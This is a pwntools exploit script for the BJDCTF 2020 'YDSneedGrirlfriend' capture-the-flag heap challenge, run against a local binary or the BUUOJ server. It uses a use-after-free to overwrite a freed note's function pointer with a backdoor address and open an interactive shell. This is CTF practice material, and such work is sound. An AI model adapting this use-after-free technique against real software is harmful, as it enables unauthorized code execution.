#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/04 08:15:15
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('bjdctf_2020_YDSneedGrirlfriend')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 29654
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('bjdctf_2020_YDSneedGrirlfriend')

backdoor = 0x400B9C

def cmd(choice):
    sh.recvuntil("Your choice :")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Her name size is :")
    sh.sendline(str(size))
    sh.recvuntil("Her name is :")
    sh.send(content)

def show(index):
    cmd(3)
    sh.recvuntil("Index :")
    sh.sendline(str(index))

def dele(index):
    cmd(2)
    sh.recvuntil("Index :")
    sh.sendline(str(index))

add(0x20,"aaaa")
add(0x20,"aaaa")
dele(0)
dele(1)
add(0x10,p64(backdoor))
gdb.attach(sh)
pause()
show(0)

sh.interactive()